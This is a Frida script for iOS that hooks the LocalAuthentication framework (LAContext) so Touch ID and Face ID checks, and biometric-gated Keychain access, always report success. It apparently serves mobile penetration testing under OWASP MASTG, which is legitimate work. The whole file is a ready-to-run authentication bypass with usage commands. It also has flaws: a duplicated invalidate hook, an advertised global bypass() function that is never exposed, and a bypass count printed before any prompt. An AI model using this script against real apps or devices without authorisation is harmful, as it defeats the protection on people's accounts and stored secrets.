/**
 * BIOMETRIC AUTHENTICATION BYPASS - iOS [STABLE]
 *
 * Purpose: Bypass Touch ID and Face ID biometric authentication in iOS apps
 * Usage: frida -U -f <BUNDLE_ID> -l biometric-bypass-ios.js
 *        or
 *        frida -U <BUNDLE_ID> -l biometric-bypass-ios.js
 *
 * What it hooks:
 * - LAContext.evaluatePolicy:localizedReason:reply: (Touch ID/Face ID authentication)
 * - LAContext.canEvaluatePolicy:error: (biometric capability check)
 * - LAContext.evaluateAccessControl:operation:localizedReason:reply: (Keychain biometric access)
 *
 * Features:
 * - Automatic bypass on first biometric prompt
 * - Support for both Touch ID and Face ID
 * - Global bypass() function for manual trigger
 * - Configurable auto-trigger mode
 * - Preserves original implementation context
 *
 * OWASP MASTG References:
 * - MASTG-TEST-0119: Test Biometric Authentication
 * - MASTG-AUTH-003: Weak Biometric Authentication
 * - MASVS-AUTH: Authentication Requirements
 *
 * Compatible with: Frida 16.x+, iOS 10-18
 *
 * Note: This is for security testing purposes only.
 * Always obtain proper authorization before testing.
 */

if (ObjC.available) {
    try {
        ObjC.schedule(ObjC.mainQueue, function() {
            console.log("[*] ================================================");
            console.log("[*] BIOMETRIC AUTHENTICATION BYPASS - iOS STARTED");
            console.log("[*] ================================================");

            var CONFIG = {
                // Automatically bypass on first biometric prompt
                autoTrigger: true,

                // Log all biometric events
                verbose: true,

                // Policies to bypass
                bypassedPolicies: [
                    'deviceOwnerAuthenticationWithBiometrics',
                    'deviceOwnerAuthentication',
                    'deviceOwnerAuthenticationWithBiometricsOrWatch'
                ]
            };

            var hooksApplied = 0;
            var bypassCount = 0;

            function logSuccess(message) {
                console.log("\x1b[32m[+]\x1b[0m " + message);
            }

            function logError(message) {
                console.log("\x1b[31m[!]\x1b[0m " + message);
            }

            function logInfo(message) {
                console.log("\x1b[33m[*]\x1b[0m " + message);
            }

            function getPolicyName(policyValue) {
                switch (policyValue) {
                    case 1:
                        return "deviceOwnerAuthenticationWithBiometrics";
                    case 2:
                        return "deviceOwnerAuthentication";
                    case 3:
                        return "deviceOwnerAuthenticationWithBiometricsOrWatch";
                    default:
                        return "unknown (" + policyValue + ")";
                }
            }

            function bypass() {
                logInfo("Manual bypass triggered - Count: " + bypassCount);
                return true;
            }

            try {
                var LAContext = ObjC.classes.LAContext;

                if (LAContext) {
                    var originalEvaluatePolicy = LAContext['- evaluatePolicy:localizedReason:reply:'];

                    if (originalEvaluatePolicy) {
                        const originalImpl = new NativeFunction(originalEvaluatePolicy.implementation, 'void', ['pointer', 'pointer', 'int64', 'pointer', 'pointer']);
                        const bypassCallback = new NativeCallback(function(self, sel, policy, localizedReason, reply) {
                            const policyStr = getPolicyName(policy);

                            if (CONFIG.verbose) {
                                logInfo("evaluatePolicy:localizedReason:reply:");
                                logInfo("    Policy: " + policyStr);
                            }

                            if (localizedReason && !ptr(localizedReason).isNull()) {
                                const reasonObj = new ObjC.Object(localizedReason);
                                if (CONFIG.verbose) {
                                    logInfo("    Reason: " + reasonObj.toString());
                                }
                            }

                            bypassCount++;
                            // Bypass: always return success by calling the reply block
                            const replyObj = new ObjC.Block(reply);
                            if (CONFIG.autoTrigger) {
                                logSuccess("evaluatePolicy bypassed - Policy: " + policyStr);
                                // Pass NULL (ptr(0)) for the NSError* argument
                                replyObj.implementation(true, ptr(0));
                            }
                        }, 'void', ['pointer', 'pointer', 'int64', 'pointer', 'pointer']);

                        Interceptor.replace(originalEvaluatePolicy.implementation, bypassCallback);
                        hooksApplied++;
                        logSuccess("LAContext.evaluatePolicy:localizedReason:reply: hooked");
                    }
                }
            } catch (e) {
                logError("LAContext.evaluatePolicy:localizedReason:reply: hook failed: " + e.message);
            }

            try {
                if (LAContext) {
                    var originalCanEvaluatePolicy = LAContext['- canEvaluatePolicy:error:'];

                    if (originalCanEvaluatePolicy) {
                        const originalImpl = new NativeFunction(originalCanEvaluatePolicy.implementation, 'bool', ['pointer', 'pointer', 'int64', 'pointer']);

                        const bypassCallback = new NativeCallback(function(self, sel, policy, error) {
                            const policyStr = getPolicyName(policy);
                            const shouldBypass = CONFIG.bypassedPolicies.includes(policyStr);

                            if (CONFIG.verbose) {
                                logInfo("canEvaluatePolicy:error: - Policy: " + policyStr);
                            }

                            // Bypass: always return YES for biometric policies
                            if (shouldBypass) {
                                if (CONFIG.verbose) {
                                    logSuccess("canEvaluatePolicy bypassed - Policy: " + policyStr);
                                }
                                return 1; // YES
                            }

                            return originalImpl(self, sel, policy, error);
                        }, 'bool', ['pointer', 'pointer', 'int64', 'pointer']);

                        Interceptor.replace(originalCanEvaluatePolicy.implementation, bypassCallback);
                        hooksApplied++;
                        logSuccess("LAContext.canEvaluatePolicy:error: hooked");
                    }
                }
            } catch (e) {
                logError("LAContext.canEvaluatePolicy:error: hook failed: " + e.message);
            }

            try {
                if (LAContext) {
                    var originalEvaluateAccessControl = LAContext['- evaluateAccessControl:operation:localizedReason:reply:'];

                    if (originalEvaluateAccessControl) {
                        const bypassCallback = new NativeCallback(function(self, sel, accessControl, operation, localizedReason, reply) {
                            if (CONFIG.verbose) {
                                logInfo("evaluateAccessControl:operation:localizedReason:reply:");

                                if (localizedReason && !ptr(localizedReason).isNull()) {
                                    const reasonObj = new ObjC.Object(localizedReason);
                                    logInfo("    Reason: " + reasonObj.toString());
                                }
                            }

                            // Bypass: call the reply block directly with success=true, error=NULL
                            bypassCount++;
                            logSuccess("evaluateAccessControl bypassed");
                            const replyBlock = new ObjC.Block(reply);
                            // Pass NULL (ptr(0)) for the NSError* argument
                            replyBlock.implementation(true, ptr(0));
                        }, 'void', ['pointer', 'pointer', 'pointer', 'int64', 'pointer', 'pointer']);

                        Interceptor.replace(originalEvaluateAccessControl.implementation, bypassCallback);
                        hooksApplied++;
                        logSuccess("LAContext.evaluateAccessControl:operation:localizedReason:reply: hooked");
                    }
                }
            } catch (e) {
                logError("LAContext.evaluateAccessControl:operation:localizedReason:reply: hook failed: " + e.message);
            }

            try {
                if (LAContext) {
                    var originalInvalidate = LAContext['- invalidate'];

                    if (originalInvalidate) {
                        const originalImpl = new NativeFunction(originalInvalidate.implementation, 'void', ['pointer', 'pointer']);

                        const bypassCallback = new NativeCallback(function(self, sel) {
                            if (CONFIG.verbose) {
                                logInfo("LAContext invalidated");
                            }
                            return originalImpl(self, sel);
                        }, 'void', ['pointer', 'pointer']);

                        Interceptor.replace(originalInvalidate.implementation, bypassCallback);
                        hooksApplied++;
                        logSuccess("LAContext.invalidate hooked");
                    }
                }
            } catch (e) {
                logError("LAContext.invalidate hook failed: " + e.message);
            }

            try {
                if (LAContext) {
                    var originalInvalidate = LAContext['- invalidate'];

                    if (originalInvalidate) {
                        const originalImpl = new NativeFunction(originalInvalidate.implementation, 'void', ['pointer', 'pointer']);

                        const bypassCallback = new NativeCallback(function(self, sel) {
                            if (CONFIG.verbose) {
                                logInfo("LAContext invalidated");
                            }
                            return originalImpl(self, sel);
                        }, 'void', ['pointer', 'pointer']);

                        Interceptor.replace(originalInvalidate.implementation, bypassCallback);
                        hooksApplied++;
                        logSuccess("LAContext.invalidate hooked");
                    }
                }
            } catch (e) {
                logError("LAContext.invalidate hook failed: " + e.message);
            }

            console.log("[*] ================================================");
            console.log("[*] Total hooks applied: " + hooksApplied);
            console.log("[*] Bypass count: " + bypassCount);
            console.log("[*] Biometric Authentication Bypass Complete");
            console.log("[*] ================================================");
            console.log("[*] Use bypass() to manually trigger biometric bypass");
        });
    } catch (e) {
        console.log("\x1b[31m[!]\x1b[0m Fatal error in main execution: " + e.message);
    }
} else {
    console.log("\x1b[31m[!]\x1b[0m Objective-C runtime not available");
}
